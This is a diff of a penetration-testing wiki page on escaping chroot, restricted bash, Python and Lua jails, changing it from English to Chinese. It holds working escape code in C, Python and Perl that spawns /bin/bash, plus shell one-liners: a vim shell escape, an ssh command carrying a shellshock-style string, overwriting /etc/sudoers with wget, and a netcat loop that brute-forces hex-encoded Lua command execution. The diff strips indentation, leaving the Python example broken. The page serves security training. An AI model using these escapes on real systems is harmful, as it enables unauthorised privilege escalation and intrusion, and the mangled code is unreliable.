@@ -1,32 +1,31 @@
-# Escaping from Jails
+# 从监狱中逃脱
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## **GTFOBins**
 
-**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**
+**在** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **中搜索是否可以执行任何具有 "Shell" 属性的二进制文件**
 
-## Chroot Escapes
+## Chroot 逃逸
 
-From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
-Usually this means that to escape you need to be root inside the chroot.
+来自 [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)：chroot 机制**并不旨在防御**来自**特权**（**root**）**用户**的故意篡改。在大多数系统中，chroot 上下文不能正确堆叠，具有足够权限的 chroot 程序**可能会执行第二次 chroot 以突破**。\
+通常这意味着要逃脱，你需要在 chroot 内部是 root。
 
 > [!TIP]
-> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.
+> **工具** [**chw00t**](https://github.com/earthquake/chw00t) 是为了滥用以下场景并从 `chroot` 中逃脱而创建的。
 
 ### Root + CWD
 
 > [!WARNING]
-> If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
+> 如果你在 chroot 内部是**root**，你**可以逃脱**，创建**另一个 chroot**。这是因为两个 chroot 不能共存（在 Linux 中），所以如果你创建一个文件夹，然后在那个新文件夹上**创建一个新的 chroot**，而你**在外面**，你现在将**在新的 chroot 之外**，因此你将处于文件系统中。
 >
-> This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.
+> 这发生是因为通常 chroot 并不会将你的工作目录移动到指定的目录，所以你可以创建一个 chroot，但在它之外。
 
-Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:
+通常你不会在 chroot 监狱中找到 `chroot` 二进制文件，但你**可以编译、上传并执行**一个二进制文件：
 
 <details>
 
 <summary>C: break_chroot.c</summary>
-
 ```c
 #include <sys/stat.h>
 #include <stdlib.h>
@@ -36,61 +35,55 @@ Usually you won't find the `chroot` binary inside a chroot jail, but you **could
 
 int main(void)
 {
-    mkdir("chroot-dir", 0755);
-    chroot("chroot-dir");
-    for(int i = 0; i < 1000; i++) {
-        chdir("..");
-    }
-    chroot(".");
-    system("/bin/bash");
+mkdir("chroot-dir", 0755);
+chroot("chroot-dir");
+for(int i = 0; i < 1000; i++) {
+chdir("..");
+}
+chroot(".");
+system("/bin/bash");
 }
 ```
-
 </details>
 
 <details>
 
 <summary>Python</summary>
-
 ```python
 #!/usr/bin/python
 import os
 os.mkdir("chroot-dir")
 os.chroot("chroot-dir")
 for i in range(1000):
-    os.chdir("..")
+os.chdir("..")
 os.chroot(".")
 os.system("/bin/bash")
 ```
-
 </details>
 
 <details>
 
 <summary>Perl</summary>
-
 ```perl
 #!/usr/bin/perl
 mkdir "chroot-dir";
 chroot "chroot-dir";
 foreach my $i (0..1000) {
-    chdir ".."
+chdir ".."
 }
 chroot ".";
 system("/bin/bash");
 ```
-
 </details>
 
 ### Root + Saved fd
 
 > [!WARNING]
-> This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.
+> 这与之前的情况类似，但在这种情况下，**攻击者将当前目录的文件描述符存储起来**，然后**在新文件夹中创建 chroot**。最后，由于他对该 **FD** **在 chroot 外部** 的 **访问**，他访问它并 **逃脱**。
 
 <details>
 
 <summary>C: break_chroot.c</summary>
-
 ```c
 #include <sys/stat.h>
 #include <stdlib.h>
@@ -100,70 +93,68 @@ system("/bin/bash");
 
 int main(void)
 {
-    mkdir("tmpdir", 0755);
-    dir_fd = open(".", O_RDONLY);
-    if(chroot("tmpdir")){
-        perror("chroot");
-    }
-    fchdir(dir_fd);
-    close(dir_fd);
-    for(x = 0; x < 1000; x++) chdir("..");
-    chroot(".");
+mkdir("tmpdir", 0755);
+dir_fd = open(".", O_RDONLY);
+if(chroot("tmpdir")){
+perror("chroot");
+}
+fchdir(dir_fd);
+close(dir_fd);
+for(x = 0; x < 1000; x++) chdir("..");
+chroot(".");
 }
 ```
-
 </details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 > [!WARNING]
-> FD can be passed over Unix Domain Sockets, so:
+> FD 可以通过 Unix Domain Sockets 传递，因此：
 >
-> - Create a child process (fork)
-> - Create UDS so parent and child can talk
-> - Run chroot in child process in a different folder
-> - In parent proc, create a FD of a folder that is outside of new child proc chroot
-> - Pass to child procc that FD using the UDS
-> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail
+> - 创建一个子进程 (fork)
+> - 创建 UDS 以便父进程和子进程可以通信
+> - 在子进程中在不同的文件夹中运行 chroot
+> - 在父进程中，创建一个位于新子进程 chroot 之外的文件夹的 FD
+> - 通过 UDS 将该 FD 传递给子进程
+> - 子进程 chdir 到该 FD，因为它在其 chroot 之外，因此将逃离监狱
 
 ### Root + Mount
 
 > [!WARNING]
 >
-> - Mounting root device (/) into a directory inside the chroot
-> - Chrooting into that directory
+> - 将根设备 (/) 挂载到 chroot 内的一个目录
+> - chroot 到该目录
 >
-> This is possible in Linux
+> 这在 Linux 中是可能的
 
 ### Root + /proc
 
 > [!WARNING]
 >
-> - Mount procfs into a directory inside the chroot (if it isn't yet)
-> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
-> - Chroot into that entry
+> - 将 procfs 挂载到 chroot 内的一个目录 (如果尚未挂载)
+> - 查找具有不同 root/cwd 条目的 pid，例如：/proc/1/root
+> - chroot 到该条目
 
 ### Root(?) + Fork
 
 > [!WARNING]
 >
-> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
-> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
-> - This children process will find himself outside of the chroot
+> - 创建一个 Fork (子进程) 并 chroot 到文件系统中更深处的不同文件夹并在其上 CD
+> - 从父进程中，将子进程所在的文件夹移动到子进程 chroot 之前的文件夹
+> - 这个子进程将发现自己在 chroot 之外
 
 ### ptrace
 
 > [!WARNING]
 >
-> - Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
-> - Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap_sys_ptrace)).
+> - 以前用户可以从自己的进程调试自己的进程……但这在默认情况下不再可能
+> - 无论如何，如果可能的话，你可以 ptrace 进入一个进程并在其中执行 shellcode ([见此示例](linux-capabilities.md#cap_sys_ptrace))。
 
 ## Bash Jails
 
 ### Enumeration
 
-Get info about the jail:
-
+获取有关监狱的信息：
 ```bash
 echo $SHELL
 echo $PATH
@@ -171,103 +162,83 @@ env
 export
 pwd
 ```
+### 修改 PATH
 
-### Modify PATH
-
-Check if you can modify the PATH env variable
-
+检查您是否可以修改 PATH 环境变量
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-
-### Using vim
-
+### 使用 vim
 ```bash
 :set shell=/bin/sh
 :shell
 ```
+### 创建脚本
 
-### Create script
-
-Check if you can create an executable file with _/bin/bash_ as content
-
+检查您是否可以创建一个以 _/bin/bash_ 为内容的可执行文件
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
+### 通过 SSH 获取 bash
 
-### Get bash from SSH
-
-If you are accessing via ssh you can use this trick to execute a bash shell:
-
+如果您通过 ssh 访问，可以使用这个技巧来执行 bash shell：
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-
-### Declare
-
+### 声明
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
-
 ### Wget
 
-You can overwrite for example sudoers file
-
+您可以覆盖例如 sudoers 文件
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-
-### Other tricks
+### 其他技巧
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
-**It could also be interesting the page:**
+[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io)\
+**这页也可能很有趣：**
 
 {{#ref}}
 ../bypass-bash-restrictions/
 {{#endref}}
 
-## Python Jails
+## Python 监狱
 
-Tricks about escaping from python jails in the following page:
+关于从 python 监狱中逃脱的技巧在以下页面：
 
 {{#ref}}
 ../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
 {{#endref}}
 
-## Lua Jails
+## Lua 监狱
 
-In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
+在此页面中，您可以找到您在 lua 中可以访问的全局函数：[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
 
-**Eval with command execution:**
-
+**带命令执行的 Eval：**
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-
-Some tricks to **call functions of a library without using dots**:
-
+一些技巧来**调用库的函数而不使用点**：
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-
-Enumerate functions of a library:
-
+列举库的函数：
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-
-Note that every time you execute the previous one liner in a **different lua environment the order of the functions change**. Therefore if you need to execute one specific function you can perform a brute force attack loading different lua environments and calling the first function of le library:
-
+请注意，每次在**不同的 lua 环境中执行前面的单行代码时，函数的顺序会改变**。因此，如果您需要执行一个特定的函数，可以通过加载不同的 lua 环境并调用库的第一个函数来进行暴力攻击：
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -278,15 +249,12 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-
-**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell (and hopefully unlimited) calling:
-
+**获取交互式 lua shell**：如果您在一个受限的 lua shell 中，可以通过调用以下命令获取一个新的 lua shell（并希望是无限的）：
 ```bash
 debug.debug()
 ```
+## 参考
 
-## References
-
-- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
+- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (幻灯片: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
 
 {{#include ../../banners/hacktricks-training.md}}
